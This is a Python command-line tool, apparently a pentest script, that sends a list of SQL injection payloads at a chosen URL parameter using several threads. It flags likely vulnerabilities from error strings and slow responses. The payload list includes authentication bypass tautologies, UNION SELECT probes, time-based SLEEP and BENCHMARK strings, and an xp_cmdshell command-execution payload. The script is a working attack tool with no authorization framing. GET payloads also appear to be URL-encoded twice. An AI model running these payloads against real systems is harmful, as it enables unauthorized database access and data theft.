import requests
import argparse
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
from time import time

class Colors:
    INFO = '\033[94m'
    SUCCESS = '\033[92m'
    WARNING = '\033[93m'
    ERROR = '\033[91m'
    END = '\033[0m'

def print_message(msg_type, message):
    """Colored console output"""
    color = getattr(Colors, msg_type.upper())
    print(f"{color}[{msg_type[0].upper()}]{Colors.END} {message}")

def load_payloads(file_path=None):
    """Load payloads from file or use defaults"""
    if file_path:
        try:
            with open(file_path, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print_message('error', f"Payload file not found: {file_path}")
    
    # Enhanced default payloads
    return [
        "' OR 1=1-- -",
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR 1=1#",
        "' OR 1=1/*",
        "admin'--",
        "1' ORDER BY 1--+",
        "1' UNION SELECT 1,2,3--+",
        "' AND 1=CONVERT(int,(SELECT table_name FROM information_schema.tables))--",
        "' EXEC xp_cmdshell('dir')--",
        "' OR EXISTS(SELECT * FROM users WHERE username='admin' AND LENGTH(password)>0)--",
        "' OR SLEEP(5)--",
        "' OR BENCHMARK(10000000,MD5(NOW()))--"
    ]

def test_payload(url, param, payload, method, timeout=5):
    """Test a single payload"""
    try:
        encoded_payload = urllib.parse.quote(payload) if method == 'GET' else payload
        data = {param: encoded_payload} if method == 'POST' else None
        params = {param: encoded_payload} if method == 'GET' else None
        
        start_time = time()
        if method == 'POST':
            r = requests.post(url, data=data, timeout=timeout)
        else:
            r = requests.get(url, params=params, timeout=timeout)
        response_time = time() - start_time
        
        content = r.text.lower()
        
        # Detection patterns
        indicators = [
            "syntax error", "mysql", "sql", "warning", 
            "unclosed quotation", "unterminated string",
            "you have an error", "time-based blind",
            "violation of primary key"
        ]
        
        if any(x in content for x in indicators):
            print_message('warning', f"Possible SQLi with payload: {payload}")
            return True
        
        # Time-based detection
        if response_time > timeout * 0.8:  # 80% of timeout threshold
            print_message('warning', f"Time-based possible with payload: {payload} (Response: {response_time:.2f}s)")
            return True
            
    except requests.exceptions.Timeout:
        print_message('warning', f"Timeout with payload: {payload} (possible blind SQLi)")
        return True
    except Exception as e:
        print_message('error', f"Request failed for {payload}: {str(e)}")
    return False

def interactive_mode():
    """Interactive user interface"""
    print("\n" + "="*50)
    print("🔥 SQL INJECTION TESTER".center(50))
    print("="*50)
    
    url = input("\nEnter target URL: ").strip()
    param = input("Enter parameter to test: ").strip()
    method = input("HTTP method [GET/POST] (default: GET): ").strip().upper() or "GET"
    custom_payloads = input("Custom payload file (leave blank for defaults): ").strip()
    
    return url, param, method, custom_payloads

def main():
    # Argument parsing
    parser = argparse.ArgumentParser(description="Advanced SQL Injection Tester")
    parser.add_argument("-u", "--url", help="Target URL")
    parser.add_argument("-p", "--param", help="Parameter to test")
    parser.add_argument("-m", "--method", choices=['GET', 'POST'], default="GET", help="HTTP method")
    parser.add_argument("-f", "--payload-file", help="File containing custom payloads")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Concurrent threads")
    parser.add_argument("--timeout", type=int, default=5, help="Request timeout in seconds")
    
    args = parser.parse_args()
    
    # Interactive mode if no args
    if not args.url or not args.param:
        args.url, args.param, args.method, payload_file = interactive_mode()
        if payload_file:
            args.payload_file = payload_file
    
    payloads = load_payloads(args.payload_file)
    
    print_message('info', f"Testing {args.url} on parameter '{args.param}' using {args.method} method")
    print_message('info', f"Loaded {len(payloads)} payloads with {args.threads} threads")
    
    vulnerable = False
    
    # Multi-threaded testing
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = []
        for payload in payloads:
            futures.append(executor.submit(
                test_payload, 
                args.url, 
                args.param, 
                payload, 
                args.method,
                args.timeout
            ))
        
        for future in futures:
            if future.result():
                vulnerable = True
    
    if vulnerable:
        print_message('success', "SQL Injection vulnerability detected!")
    else:
        print_message('success', "No SQL Injection vulnerabilities found")

if __name__ == "__main__":
    main()